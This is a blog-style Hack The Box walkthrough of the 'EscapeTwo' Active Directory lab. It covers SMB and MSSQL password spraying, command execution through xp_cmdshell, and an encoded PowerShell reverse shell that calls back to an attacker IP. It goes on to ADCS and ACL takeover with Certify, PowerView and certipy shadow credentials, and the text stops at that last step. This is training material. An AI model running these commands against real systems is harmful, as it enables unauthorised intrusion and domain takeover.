---
title: "Escapetwo"
date: 2025-02-15
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "escapetwo", "htb walkthrough", "hackthebox", "writeup"]
---

OS: Windows
Difficulty: Easy
Note: Assumed Breach

## Learned

>- `sa` account is a well known SQL Server account.
- can password spray MSSQL using nxc
- can obtain RCE with MSSQL using nxc
- nxc mssql `pawn3d!` -> means full privilge -> can execute `xp_cmdshell`

## Assumed Breach 

The provided credentials

```text
rose : KxEPkKe6R8su
oscar : 86LxLBMgEWaKUnBG
sa : sa:MSSQLP@ssw0rd!
ryan : WqSZAF6CysDQbGb3
```

## Enumeration

### Nmap

```sh
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-11 01:56:08Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
...
|_ssl-date: 2025-04-11T02:05:01+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
...
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-04-11T02:05:01+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
...
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
...
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
...
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49722/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49743/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49804/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

### SMB

Using the provided credential

```sh
nxc smb sequel.htb -u rose  -p KxEPkKe6R8su -M spider_plus
```

![screenshot](/assets/images/escapetwo1.png)

![screenshot](/assets/images/escapetwo2.png)

```sh
smbclient //sequel.htb/"Accounting Department" -U 'rose'
```

![screenshot](/assets/images/escapetwo3.png)

#### Enumerating Files

![screenshot](/assets/images/escapetwo4.png)

![screenshot](/assets/images/escapetwo5.png)

Users

![screenshot](/assets/images/escapetwo6.png)

Usernames & passwords

![screenshot](/assets/images/escapetwo7.png)

Password spray SMB

![screenshot](/assets/images/escapetwo8.png)

Searching for `sa`

![screenshot](/assets/images/escapetwo9.png)

![screenshot](/assets/images/escapetwo10.png)


Password spray 

```sh
nxc mssql 10.10.11.51 -u users.txt -p password.txt --continue-on-success --local-auth
```

![screenshot](/assets/images/escapetwo12.png)

## Foothold

### MSSQL 

```sh
nxc mssql 10.10.11.51 -u users.txt -p password.txt --continue-on-success --local-auth
```

![screenshot](/assets/images/escapetwo11.png)

### Execute a PowerShell based reverse shell

```sh
# impacket-ntlmrelayx
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e
<base64 reverse shell>'

# nxc
netexec mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANgAnACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACIALgAgAHsAIAAkAGQAYQB0AGEAIAB9ACAAMgA+ACYAMQAiACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

After the `powershell -e` used PowerShell#3 from revshells.com

![screenshot](/assets/images/escapetwo13.png)

## Privilege Escalation

### Enumeration

![screenshot](/assets/images/escapetwo14.png)

![screenshot](/assets/images/escapetwo15.png)

Kerberoasting checks

![screenshot](/assets/images/escapetwo16.png)

![screenshot](/assets/images/escapetwo18.png)

### Password spray winRM

```sh
nxc winrm sequel.htb -u users.txt -p password.txt
```

![screenshot](/assets/images/escapetwo19.png)

### Using Certify.exe

[Certify.exe](https://github.com/GhostPack/Certify?tab=readme-ov-file#example-walkthrough)

![screenshot](/assets/images/escapetwo17.png)

```sh
./Certify.exe request /ca:dc.sequel.htb\sequel-DC01-CA /template:VulnTemplate /altname:localadmin
```

https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained

```sh
certipy account create -u username@domain -p password -user <Account Name> -dns <dNSHostName> [-dc-ip <DC IP>]

./Certify.exe account create -u svc_sql -p r00t -user 
```

![screenshot](/assets/images/escapetwo20.png)

# Running BloodHound
```sh
sudo bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -ns 10.10.11.51 -d sequel.htb -c all
```


The ca_svc account is typically used by the Certificate Authority (CA) service. This service is responsible for issuing and managing certificates for users, devices, and servers across the AD domain. By gaining control over this account, we can potentially manipulate certificate issuance

```sh
Get-DomainUser -Identity ryan | Select ObjectSid
```

![screenshot](/assets/images/escapetwo22.png)

```sh
$sid = Convert-NameToSid ryan
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

![screenshot](/assets/images/escapetwo23.png)
```sh
Set-DomainObjectOwner -Identity 'ca_svc' -OwnerIdentity ryan


Add-DomainObjectAcl -TargetIdentity 'ca_svc' -PrincipalIdentity ryan -Rights fullcontrol

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "ca_svc" -PrincipalIdentity "ryan"
```

# PowerView.py

```sh
powerview sequel.htb/ryan:'WqSZAF6CysDQbGb3'@10.10.11.51

Get-DomainUser -Identity ryan -Select ObjectSid
```

![screenshot](/assets/images/escapetwo24.png)

```sh
Get-DomainObjectAcl -ResolveGUIDs -SecurityIdentifier S-1-5-21-548670397-972687484-3496335370-1114
```

![screenshot](/assets/images/escapetwo25.png)

> Ryan is the `WriteOwner` of ca_svc

```sh
Set-DomainObjectOwner -TargetIdentity ca_svc -PrincipalIdentity ryan
```

![screenshot](/assets/images/escapetwo26.png)

```sh
Add-DomainObjectAcl -TargetIdentity ca_svc -PrincipalIdentity ryan -Rights fullcontrol
```

![screenshot](/assets/images/escapetwo27.png)

```sh
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
```

![screenshot](/assets/images/escapetwo28.png)
